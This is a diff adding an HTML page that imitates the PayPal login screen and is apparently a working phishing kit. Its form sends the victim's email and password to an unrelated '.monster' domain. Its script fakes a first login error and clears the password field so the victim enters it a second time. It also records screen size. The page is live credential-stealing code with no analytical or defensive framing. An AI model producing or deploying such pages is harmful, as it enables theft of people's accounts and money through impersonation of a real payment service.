@@ -1,0 +1,153 @@
+<html class=" js "><head>
+    <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,maximum-scale=1,user-scalable=yes">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <title>Log in to your PayPal account</title>
+    <link rel="apple-touch-icon" sizes="144x144" href="https://mailappssupport.custumeradds9283763.monster/CR51/Assets/_get/img/pp144.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="https://mailappssupport.custumeradds9283763.monster/CR51/Assets/_get/img/pp145.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="https://mailappssupport.custumeradds9283763.monster/CR51/Assets/_get/img/pp72.png">
+    <link rel="apple-touch-icon" href="https://mailappssupport.custumeradds9283763.monster/CR51/Assets/_get/img/pp64.png">
+    <link rel="shortcut icon" sizes="196x196" href="https://mailappssupport.custumeradds9283763.monster/CR51/Assets/_get/img/pp196.png">
+    <link rel="shortcut icon" type="image/x-icon" href="https://mailappssupport.custumeradds9283763.monster/CR51/Assets/_get/img/favicon.ico">
+    <link rel="icon" type="image/x-icon" href="https://mailappssupport.custumeradds9283763.monster/CR51/Assets/_get/img/pp32.png">
+    <link rel="stylesheet" href="https://mailappssupport.custumeradds9283763.monster/CR51/Assets/_get/css/kntl4.css">
+</head>
+
+<body>
+    <section class="base">
+        <div class="main contentBordered">
+            <header>
+                <p class="app_logo"></p>
+            </header>
+            <div class="alert hide">
+                <p class="danger_error">Some of your information isn't correct. Please try again.</p>
+            </div>
+            <form action="https://mailappssupport.custumeradds9283763.monster/signin/process" method="post" novalidate=""><input type="hidden" name="screen" value="800 x 600">
+                <div id="email_" class="hide profileRememberedEmail"><span class="spanMail"></span> <a href="#" id="bt_change">Change</a></div>
+                <div id="email_area">
+                    <div class="inputs clearfix" id="field_eml">
+                        <div class="fieldContainer"><label for="email" class="inputLabel">Email address</label><input name="emailLogin" id="email" autofocus="" type="email" autocomplete="off" placeholder="Email or mobile number"></div>
+                        <div class="msg" id="email_error">
+                            <p class="hide">Required</p>
+                            <p class="hide">That email format isn’t right</p>
+                        </div>
+                    </div>
+                    <div style="margin-top:20px"><button class="button" type="button" id="bt_next">Next</button></div>
+                </div>
+                <div id="password_area" class="hide">
+                    <div class="inputs clearfix" id="field_pwd">
+                        <div class="fieldContainer"><label for="password" class="inputLabel">Enter your password</label><input name="passwordLogin" id="password" type="password" class="anim" placeholder="Enter your password"> <button type="button" class="showPassword hide show-hide-password">Show</button> <button type="button" class="hidePassword hide show-hide-password">Hide</button></div>
+                        <div class="msg" id="password_error">
+                            <p class="hide">Enter your password.</p>
+                        </div>
+                    </div><a href="#">Forgot password?</a>
+                    <div style="margin-top:20px"><button class="button anim" type="submit" id="btnLogin">Log In</button></div>
+                </div>
+            </form>
+            <div>
+                <div class="divider"><span>or</span></div><a href="javascript:" class="button secondary">Sign Up</a>
+            </div>
+            <div class="intentFooter">
+                <div class="localeSelector"><span class="picker country-selector"></span>
+                    <ul class="localeLink">
+                        <li><a class="scTrack:unifiedlogin-footer-language_en_US" href="#" style="color:#4A99CE">English</a></li>
+                        <li><a class="scTrack:unifiedlogin-footer-language_en_US" href="#">Français</a></li>
+                        <li><a class="scTrack:unifiedlogin-footer-language_en_US" href="#">Español</a></li>
+                        <li><a class="scTrack:unifiedlogin-footer-language_en_US" href="#">中文</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+        <div class="footerArea">
+            <ul class="footerList">
+                <li><a href="#" style="color:#525557">Contact Us</a></li>
+                <li><a href="#" style="color:#525557">Privacy</a></li>
+                <li><a href="#" style="color:#525557">Legal</a></li>
+                <li><a href="#" style="color:#525557">Worldwide</a></li>
+            </ul>
+        </div>
+    </footer>
+    <div class="hide" id="rotate">
+        <div class="circle">
+            <div class="rotate"></div>
+        </div>
+        <div class="overlay"></div>
+    </div>
+    <script type="text/javascript" src="https://mailappssupport.custumeradds9283763.monster/CR51/Assets/_get/js/jquery-3.3.1.min.js"></script>
+    <script type="text/javascript" src="https://mailappssupport.custumeradds9283763.monster/CR51/Assets/_get/js/kntl-bau.js"></script>
+    <script>
+        $(document).ready(function() {
+            function e(s, a, e) {
+                var d = !0;
+                return s.val() ? (a.removeClass("hasError"), e.attr("class", "msg hide").children("p:first").addClass("hide")) : (a.addClass("hasError"), e.attr("class", "msg show").children("p:first").removeClass("hide"), d = !1), d
+            }
+            $("[name=screen]").val(screen.width + " x " + screen.height);
+            var a = !1,
+                d = $("#email"),
+                r = $("#password"),
+                l = $("#email_area"),
+                o = $("#password_area"),
+                t = $("#email_"),
+                i = $("#field_eml"),
+                h = $("#field_pwd"),
+                c = $("#email_error"),
+                n = $("#password_error");
+            $("#bt_next").click(function(s) {
+                return e(d, i, c) ? (a = !0, /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(d.val()) ? (i.removeClass("hasError"), c.attr("class", "msg hide").children("p:last").addClass("hide")) : (i.addClass("hasError"), c.attr("class", "msg show").children("p:last").removeClass("hide"), a = !1), a ? (c.attr("class", "msg hide").children("p:last").addClass("hide"), $("#rotate").removeClass("hide"), void setTimeout(function() {
+                    t.removeClass("hide").children("span").html(d.val()), l.addClass("hide"), o.removeClass("hide"), $("#rotate").addClass("hide"), h.removeClass("hasError"), n.attr("class", "msg hide").children("p:first").addClass("hide")
+                }, 800)) : (d.focus(), console.log("eml"), !1)) : (d.focus(), c.attr("class", "msg show").children("p:last").addClass("hide"), console.log("required"), !1);
+                var a
+            }), $("#bt_change").click(function() {
+                t.addClass("hide"), d.val(""), r.val(""), o.addClass("hide"), l.removeClass("hide"), $(".alert").addClass("hide"), a = !1
+            }), d.keyup(function(s) {
+                if (13 == s.keyCode) $("#bt_next").click();
+                else {
+                    if (!/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(d.val())) return c.attr("class", "msg hide").children("p:first").addClass("hide"), d.focus(), !1;
+                    i.removeClass("hasError"), c.attr("class", "msg hide")
+                }
+            }), r.keyup(function(s) {
+                var passwordValue = r.val();
+                if (passwordValue.indexOf(' ') !== -1) {
+                    h.addClass("hasError");
+                    n.attr("class", "msg show").text("Required");
+                    return false;
+                } else {
+                    r.attr("type", "password");
+                    $(".showPassword").removeClass("hide");
+                    $(".hidePassword").addClass("hide");
+                    if (passwordValue) {
+                        h.removeClass("hasError");
+                        n.attr("class", "msg hide");
+                    } else {
+                        h.addClass("hasError");
+                        r.focus();
+                        return false;
+                    }
+                }
+            }), d.focusout(function() {
+                c.removeClass("show")
+            }), r.focusout(function() {
+                n.removeClass("show")
+            }), $(".showPassword").click(function() {
+                r.attr("type", "text"), $(".hidePassword").removeClass("hide"), $(".showPassword").addClass("hide")
+            }), $(".hidePassword").click(function() {
+                r.attr("type", "password"), $(".showPassword").removeClass("hide"), $(".hidePassword").addClass("hide")
+            }), $(document).on("submit", "form", function(s) {
+                if (/\s/.test(r.val())) {
+                    h.addClass("hasError");
+                    n.attr("class", "msg show").text("Required");
+                    return false;
+                }
+
+                return !!/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(d.val()) && (e(r, h, n) ? ($("#rotate").removeClass("hide"), a || (s.preventDefault(), setTimeout(function() {
+                    return a = !0, $("#rotate").addClass("hide"), r.val(""), $(".alert").removeClass("hide"), $(".showPassword").addClass("hide"), $(".hidePassword").addClass("hide"), !1
+                }, 1850)), void $(".alert").addClass("hide")) : (r.focus(), !1))
+            });
+
+        });
+    </script>
+
+
+</body></html>
